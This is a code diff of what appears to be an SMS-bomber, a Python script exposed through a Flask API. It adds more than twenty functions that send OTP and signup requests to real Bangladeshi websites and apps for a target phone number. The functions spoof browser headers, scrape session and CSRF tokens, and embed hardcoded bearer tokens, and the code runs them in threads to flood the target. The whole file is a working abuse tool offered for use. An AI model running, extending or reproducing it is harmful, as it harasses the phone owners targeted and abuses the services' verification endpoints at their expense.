@@ -1,11 +1,15 @@
-#Copyright @ISmartCoder
-#Updates Channel https://t,me/TheSmartDev
 import requests
 import random
 import string
+import re # Added for regex parsing in api_23
 import threading
 import time
 from concurrent.futures import ThreadPoolExecutor
+from flask import Flask, request, jsonify, make_response
+from flask_cors import CORS
+
+app = Flask(__name__)
+CORS(app, origins=["https://sms-bmbr-api.vercel.app"]) # This CORS is for API calls, not for iframe embedding.
 
 def random_string(pattern):
     result = ''
@@ -25,7 +29,8 @@ def send_request(url, method, headers, data=None):
         else:
             response = requests.get(url, headers=headers, timeout=10)
         return response
-    except:
+    except requests.exceptions.RequestException as e:
+        print(f"Request failed: {e}")
         return None
 
 def api_1(number, pgen, egen, did, name):
@@ -278,37 +283,656 @@ def api_16(number):
         return send_request(url, "POST", headers, data)
     return None
 
-def process_number(number, amount):
-    apis = [api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_11, api_12, api_13, api_14, api_15, api_16]
+def api_17(number):
+    url = "https://www.thebodyshop.com.bd/customer/account/create/"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+        "Pragma": "no-cache",
+        "Accept": "*/*"
+    }
+    response = send_request(url, "GET", headers)
+    if response:
+        cookies = response.cookies.get_dict()
+        pid = cookies.get('PHPSESSID', '')
+        url = "https://www.thebodyshop.com.bd/otpmanagement/transactional/sendOtp"
+        headers = {
+            "Host": "www.thebodyshop.com.bd",
+            "Cookie": f"PHPSESSID={pid}",
+            "Sec-Ch-Ua-Platform": "\"Windows\"",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+            "Accept": "*/*",
+            "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Sec-Ch-Ua-Mobile": "?0",
+            "Origin": "https://www.thebodyshop.com.bd",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Referer": "https://www.thebodyshop.com.bd/customer/account/create/",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Priority": "u=1, i",
+            "Connection": "keep-alive"
+        }
+        data = f"data=88{number}"
+        return send_request(url, "POST", headers, data)
+    return None
+
+def api_18(number, did2):
+    url = "https://banglaflix.com.bd/api4/flix_signup.php"
+    headers = {
+        "Accept-Encoding": "gzip",
+        "Connection": "Keep-Alive",
+        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+        "Host": "banglaflix.com.bd",
+        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_I005DA Build/PI)"
+    }
+    data = f"release=9&simSerialNumber=no access&imsi=no access&deviceId={did2}&operatorName=Reliance Jio&operator=405840&versionCode=52&forget=forget&imei=no access&model=ASUS_I005DA&sdkVersion=28&msisdn=88{number}&brand=Asus&softwareVersion=no access"
+    return send_request(url, "POST", headers, data)
+
+def api_19(number):
+    url = f"https://web-api.binge.buzz/api/v3/otp/send/+88{number}"
+    headers = {
+        "Host": "web-api.binge.buzz",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "Authorization": "",
+        "Device-Type": "web",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Origin": "https://binge.buzz",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://binge.buzz/",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1, i",
+        "Connection": "keep-alive"
+    }
+    return send_request(url, "GET", headers)
+
+def api_20(number):
+    url = f"https://romoni.com.bd/api/send-otp?phone={number}"
+    headers = {
+        "Host": "romoni.com.bd",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Baggage": "sentry-environment=production,sentry-release=880ca2140ae01e8be9f40d7038e86f8cad534c12,sentry-public_key=f2f87e089348282a3638da93ac482415,sentry-trace_id=57e4f4f49fe5419f9318753fb854a4f6,sentry-sampled=true,sentry-sample_rand=0.6108252277741908,sentry-sample_rate=1",
+        "Sentry-Trace": "57e4f4f49fe5419f9318753fb854a4f6-a216e13e893c2e20-1",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://romoni.com.bd/signup",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1, i"
+    }
+    return send_request(url, "GET", headers)
+
+def api_21(number, egen, name):
+    url = "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php"
+    headers = {
+        "Host": "go-app.paperfly.com.bd",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Device_identifier": "undefined",
+        "Device_name": "undefined",
+        "Origin": "https://go.paperfly.com.bd",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://go.paperfly.com.bd/",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1, i"
+    }
+    data = {"full_name": f"{name} Koaa", "company_name": f"{name} Limites", "email_address": f"{egen}@gmail.com", "phone_number": number}
+    return send_request(url, "POST", headers, data)
+
+def api_22(number):
+    url = f"https://chinaonlinebd.com/api/login/getOtp?phone={number}"
+    headers = {
+        "Host": "chinaonlinebd.com",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Token": "45601f3d391886fcec5f5a3f26780f21",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://chinaonlinebd.com/login?next=/dashboard",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1, i"
+    }
+    return send_request(url, "POST", headers, data={}) # Empty data for POST
+
+def api_23(number):
+    url = "https://accounts.sheba.xyz/login"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+        "Pragma": "no-cache",
+        "Accept": "*/*"
+    }
+    response = send_request(url, "GET", headers)
+    if response:
+        cookies = response.cookies.get_dict()
+        xt = cookies.get('XSRF-TOKEN', '')
+        ac = cookies.get('accounts_sheba', '')
+        
+        # Extract appID and xpid from response text (this is a simplified parsing, might need regex for robustness)
+        id_match = re.search(r'this.appID = "([^"]+)";', response.text)
+        xid_match = re.search(r'\.loader_config={xpid:"([^"]+)",', response.text)
+        
+        app_id = id_match.group(1) if id_match else ""
+        xpid = xid_match.group(1) if xid_match else ""
+
+        url_token = f"https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id={app_id}"
+        headers_token = {
+            "Host": "accounts.sheba.xyz",
+            "Cookie": f"XSRF-TOKEN={xt}; accounts_sheba={ac}",
+            "X-Newrelic-Id": xpid,
+            "Sec-Ch-Ua-Platform": "\"Windows\"",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+            "Accept": "*/*",
+            "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+            "Sec-Ch-Ua-Mobile": "?0",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Referer": "https://accounts.sheba.xyz/login",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Priority": "u=1, i"
+        }
+        response_token = send_request(url_token, "GET", headers_token)
+        
+        if response_token:
+            token_match = re.search(r'token":"([^"]+)"}', response_token.text)
+            token = token_match.group(1) if token_match else ""
+
+            url_otp = "https://accountkit.sheba.xyz/api/shoot-otp"
+            headers_otp = {
+                "Host": "accountkit.sheba.xyz",
+                "Sec-Ch-Ua-Platform": "\"Windows\"",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+                "Accept": "application/json, text/javascript, */*; q=0.01",
+                "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+                "Content-Type": "application/json",
+                "Sec-Ch-Ua-Mobile": "?0",
+                "Origin": "https://accounts.sheba.xyz",
+                "Sec-Fetch-Site": "same-site",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Dest": "empty",
+                "Referer": "https://accounts.sheba.xyz/",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Priority": "u=1, i"
+            }
+            data_otp = {"mobile": f"+88{number}", "app_id": app_id, "api_token": token}
+            return send_request(url_otp, "POST", headers_otp, data_otp)
+    return None
+
+def api_24(number, pgen, name):
+    url = "https://mybackend-bstw.onrender.com/api/v1/auth/registration"
+    headers = {
+        "Host": "mybackend-bstw.onrender.com",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "Authorization": "Bearer ihateyoucodding",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Content-Type": "application/json",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Origin": "https://www.volthbd.com",
+        "Sec-Fetch-Site": "cross-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://www.volthbd.com/",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1, i"
+    }
+    data = {"firstName": f"Dilan {name}", "phoneNumber": number, "password": pgen, "affiliateRef": None}
+    return send_request(url, "POST", headers, data)
+
+def api_25(number):
+    url = "https://www.livemcq.com/web-otp-send/"
+    headers = {
+        "Host": "www.livemcq.com",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-User": "?1",
+        "Sec-Fetch-Dest": "document",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=0, i",
+        "Connection": "keep-alive"
+    }
+    response = send_request(url, "GET", headers)
+    if response:
+        cookies = response.cookies.get_dict()
+        cstk = cookies.get('csrftoken', '')
+        url_verify = f"https://www.livemcq.com/web-otp-verify/?phone_number={number}"
+        headers_verify = {
+            "Host": "www.livemcq.com",
+            "Cookie": f"csrftoken={cstk}",
+            "Cache-Control": "max-age=0",
+            "Upgrade-Insecure-Requests": "1",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-User": "?1",
+            "Sec-Fetch-Dest": "document",
+            "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+            "Sec-Ch-Ua-Mobile": "?0",
+            "Sec-Ch-Ua-Platform": "\"Windows\"",
+            "Referer": "https://www.livemcq.com/web-otp-send/",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Priority": "u=0, i"
+        }
+        return send_request(url_verify, "GET", headers_verify)
+    return None
+
+def api_26(number):
+    url = "https://new.mojaru.com/api/student/registration"
+    headers = {
+        "Host": "new.mojaru.com",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Content-Type": "application/json",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Accept": "*/*",
+        "Origin": "https://mojaru.com",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://mojaru.com/",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1, i"
+    }
+    data = {"mobile_or_email": number}
+    return send_request(url, "POST", headers, data)
+
+def api_27(number):
+    url = "https://new.mojaru.com/api/student/login"
+    headers = {
+        "Host": "new.mojaru.com",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Content-Type": "application/json",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Accept": "*/*",
+        "Origin": "https://mojaru.com",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://mojaru.com/",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1, i"
+    }
+    data = {"mobile_or_email": number}
+    return send_request(url, "POST", headers, data)
+
+def api_28(number):
+    url = "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+        "Pragma": "no-cache",
+        "Accept": "*/*"
+    }
+    data = {"phoneNumber": f"+88{number}"}
+    return send_request(url, "POST", headers, data)
+
+def api_29(number):
+    url = "https://chokrojan.com/api/v1/passenger/login/mobile"
+    headers = {
+        "Host": "chokrojan.com",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "Authorization": "Bearer null",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "User-Platform": "3",
+        "Access-Control-Allow-Origin": "*",
+        "Company-Id": "1",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Domain-Name": "chokrojan.com",
+        "Content-Type": "application/json;charset=UTF-8",
+        "Origin": "https://chokrojan.com",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://chokrojan.com/login",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1, i",
+        "Connection": "keep-alive"
+    }
+    data = {"mobile_number": number}
+    return send_request(url, "POST", headers, data)
+
+def api_30(number):
+    url = "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0"
+    headers = {
+        "Accept-Encoding": "gzip",
+        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s",
+        "Connection": "Keep-Alive",
+        "Content-Type": "application/json; charset=utf-8",
+        "Host": "backend-api.shomvob.co",
+        "If-None-Match": "W/\"149-S9sRrXq7y+7G+40CRB5M3TCF6a0\"",
+        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_I005DA Build/PI)"
+    }
+    data = {"phone": f"88{number}"}
+    return send_request(url, "POST", headers, data)
+
+def api_31(number):
+    url = "https://api.arogga.com/auth/v1/sms/send?f=app&v=6.2.35&os=android&osv=28"
+    headers = {
+        "Accept-Encoding": "gzip",
+        "Connection": "Keep-Alive",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Host": "api.arogga.com",
+        "User-Agent": "okhttp/4.9.2"
+    }
+    data = f"mobile={number}&fcmToken=cQNuZawqQAa_RlLyefabwM%3AAPA91bEch7lyfhnhwW9XBx8crxErLQr4_HCx3aefaEDNdiVD7VspFMca4v3BQnvIwmoSb5w3Zvp0oVDG4GeOfc6lZCDupbT3uvXLujlcAbbxPAzcUE73Cxs&referral="
+    return send_request(url, "POST", headers, data=data.encode('utf-8')) # requests library expects bytes for x-www-form-urlencoded
+
+def api_32(number):
+    url = "https://backend.timezonebd.com/api/v1/user/otp-login"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+        "Pragma": "no-cache",
+        "Accept": "*/*"
+    }
+    data = {"phone": number}
+    return send_request(url, "POST", headers, data)
+
+def api_33(number):
+    url = "https://api.bdtickets.com:20100/v1/auth"
+    headers = {
+        "Host": "api.bdtickets.com:20100",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Content-Type": "application/json",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Origin": "https://bdtickets.com",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://bdtickets.com/",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1,"
+    }
+    data = {"createUserCheck": True, "phoneNumber": f"+88{number}", "applicationChannel": "WEB_APP"}
+    return send_request(url, "POST", headers, data)
+
+def api_34(number):
+    url = "https://api.cartup.com/customer/api/v1/customer/auth/new-onboard/signup"
+    headers = {
+        "Host": "api.cartup.com",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Content-Type": "application/json; charset=utf-8",
+        "Sxsrf": "V2xoc1MyVldiRmhPVjNScFRXcENjRlF5Y0VKa1ZURnhZWHBLVG1Wc1ZUQlVhMUpHVFZVNVJWTlljRTVoYldSNlUxYzFUMk5HYjNsT1IyeFFZVlZ3YzFSWWNISk5hekI1VTIweFlXRnRVbkpYYTFKTFlXczFTRmRZY0U1U1JrcDBWRmN4VDJGc2NFaFNiWGhQVmtack1GUnVjRzloUm14eFYxUlNUMVpGUmpaWGJGSkNaVlV4VlZadGFGQlNNV3N4VjFod2JrNVZOVmhXVkZKaFZrVlZlbFJ1Y0hOaGJIQlZVVzFzWVZJd2JEVlRWMnd6WVZad1dXRklaR2hYUlhCeldUTnNTazVyTVZWWmVrWlBZV3RHTTFSc1VrcE5hekZKVFVRd1BRPT0=",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Accept": "*/*",
+        "Origin": "https://cartup.com",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://cartup.com/",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1, i"
+    }
+    data = {"email_or_phone": number}
+    return send_request(url, "POST", headers, data)
+
+def api_35(number):
+    url = "https://auth.acsfutureschool.com/api/v1/otp/send"
+    headers = {
+        "Host": "auth.acsfutureschool.com",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Content-Type": "application/json",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Origin": "https://www.acsfutureschool.com",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://www.acsfutureschool.com/",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1, i"
+    }
+    data = {"phone": number}
+    return send_request(url, "POST", headers, data)
+
+def api_36(number):
+    url = "https://api.chardike.com/api/otp/send"
+    headers = {
+        "Host": "api.chardike.com",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Content-Type": "application/json",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Accept": "*/*",
+        "Origin": "https://chardike.com",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://chardike.com/",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1, i",
+        "Connection": "keep-alive"
+    }
+    data = {"phone": number, "otp_type": "login"}
+    return send_request(url, "POST", headers, data)
+
+def api_37(number):
+    url = "https://bb-api.bohubrihi.com/public/activity/otp"
+    headers = {
+        "Host": "bb-api.bohubrihi.com",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "Authorization": "Bearer undefined",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Content-Type": "application/json",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Origin": "https://bohubrihi.com",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://bohubrihi.com/",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1, i"
+    }
+    data = {"phone": number, "intent": "login"}
+    return send_request(url, "POST", headers, data)
+
+def api_38(number):
+    url = "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web"
+    headers = {
+        "Host": "api-dynamic.chorki.com",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "Authorization": "",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Accept": "application/json",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Content-Type": "application/json",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Origin": "https://www.chorki.com",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://www.chorki.com/",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1, i"
+    }
+    data = {"number": f"+880{number[1:]}"}
+    return send_request(url, "POST", headers, data)
+
+def api_39(number):
+    url = "https://api.ostad.app/api/v2/user/with-otp"
+    headers = {
+        "Host": "api.ostad.app",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "Metadata": "{\"browser\":{\"name\":\"Chrome\",\"version\":\"139.0.0.0\",\"major\":\"139\"},\"cpu\":{\"architecture\":\"amd64\"},\"device\":{},\"engine\":{\"name\":\"Blink\",\"version\":\"139.0.0.0\"},\"os\":{\"name\":\"Windows\",\"version\":\"10\"},\"displayResolution\":{\"width\":1440,\"height\":900},\"deviceType\":\"web\",\"domain\":\"ostad.app\",\"brand\":\"Chrome\",\"model\":\"Windows\"}",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Content-Type": "application/json",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Accept": "*/*",
+        "Origin": "https://ostad.app",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://ostad.app/",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1, i"
+    }
+    data = {"msisdn": number}
+    return send_request(url, "POST", headers, data)
+
+def api_40(number):
+    url = "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web"
+    headers = {
+        "Host": "api.deeptoplay.com",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "Authorization": "",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Accept": "application/json",
+        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+        "Content-Type": "application/json",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Origin": "https://www.deeptoplay.com",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://www.deeptoplay.com/",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Priority": "u=1, i"
+    }
